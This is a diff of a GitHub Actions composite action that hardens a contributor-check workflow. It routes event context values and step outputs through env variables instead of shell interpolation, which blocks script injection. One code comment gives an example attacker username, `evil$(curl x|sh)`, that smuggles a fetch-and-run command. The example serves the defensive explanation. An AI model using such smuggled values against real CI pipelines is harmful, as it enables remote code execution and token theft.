@@ -46,23 +46,35 @@ runs:
     - name: Resolve inputs
       id: inputs
       shell: bash
+      env:
+        # Pass GitHub context values through the env block rather than
+        # ${{ }} expression interpolation inside the shell. A username
+        # like `evil$(curl x|sh)` is attacker-controllable on a PR;
+        # without this, the shell would expand it. With it, the value
+        # arrives as a literal bash variable.
+        EVENT_NAME: ${{ github.event_name }}
+        PR_USER_LOGIN: ${{ github.event.pull_request.user.login }}
+        PR_NUMBER: ${{ github.event.pull_request.number }}
+        ISSUE_USER_LOGIN: ${{ github.event.issue.user.login }}
+        ISSUE_NUMBER: ${{ github.event.issue.number }}
+        DISPATCH_USERNAME: ${{ github.event.inputs.username || '' }}
+        INPUT_TARGET_REPO: ${{ inputs.target-repo }}
+        REPOSITORY: ${{ github.repository }}
       run: |
         username=""
         number="0"
         type="manual"
 
-        event_name="${{ github.event_name }}"
-
-        if [ "$event_name" = "pull_request_target" ] || [ "$event_name" = "pull_request" ]; then
-          username="${{ github.event.pull_request.user.login }}"
-          number="${{ github.event.pull_request.number }}"
+        if [ "$EVENT_NAME" = "pull_request_target" ] || [ "$EVENT_NAME" = "pull_request" ]; then
+          username="$PR_USER_LOGIN"
+          number="$PR_NUMBER"
           type="pr"
-        elif [ "$event_name" = "issues" ]; then
-          username="${{ github.event.issue.user.login }}"
-          number="${{ github.event.issue.number }}"
+        elif [ "$EVENT_NAME" = "issues" ]; then
+          username="$ISSUE_USER_LOGIN"
+          number="$ISSUE_NUMBER"
           type="issue"
-        elif [ "$event_name" = "workflow_dispatch" ]; then
-          username="${{ github.event.inputs.username || '' }}"
+        elif [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+          username="$DISPATCH_USERNAME"
           type="manual"
         fi
 
@@ -70,9 +82,9 @@ runs:
         echo "number=$number" >> "$GITHUB_OUTPUT"
         echo "type=$type" >> "$GITHUB_OUTPUT"
 
-        target="${{ inputs.target-repo }}"
+        target="$INPUT_TARGET_REPO"
         if [ -z "$target" ]; then
-          target="${{ github.repository }}"
+          target="$REPOSITORY"
         fi
         echo "target_repo=$target" >> "$GITHUB_OUTPUT"
 
@@ -81,14 +93,23 @@ runs:
       shell: bash
       env:
         GITHUB_TOKEN: ${{ inputs.github-token }}
+        ACTION_PATH: ${{ github.action_path }}
+        # Step outputs that include an attacker-influenced username
+        # must also flow via env: into the shell.
+        STEP_USERNAME: ${{ steps.inputs.outputs.username }}
+        STEP_NUMBER: ${{ steps.inputs.outputs.number }}
+        STEP_TYPE: ${{ steps.inputs.outputs.type }}
+        STEP_TARGET_REPO: ${{ steps.inputs.outputs.target_repo }}
+        INPUT_CHECKS: ${{ inputs.checks }}
+        INPUT_RISK_THRESHOLD: ${{ inputs.risk-threshold }}
       run: |
-        python "${{ github.action_path }}/../../../scripts/contributor_check_action.py" \
-          --username "${{ steps.inputs.outputs.username }}" \
-          --checks "${{ inputs.checks }}" \
-          --target-repo "${{ steps.inputs.outputs.target_repo }}" \
-          --risk-threshold "${{ inputs.risk-threshold }}" \
-          --number "${{ steps.inputs.outputs.number }}" \
-          --item-type "${{ steps.inputs.outputs.type }}"
+        python "$ACTION_PATH/../../../scripts/contributor_check_action.py" \
+          --username "$STEP_USERNAME" \
+          --checks "$INPUT_CHECKS" \
+          --target-repo "$STEP_TARGET_REPO" \
+          --risk-threshold "$INPUT_RISK_THRESHOLD" \
+          --number "$STEP_NUMBER" \
+          --item-type "$STEP_TYPE"
 
     - name: Cleanup temporary files
       if: always()
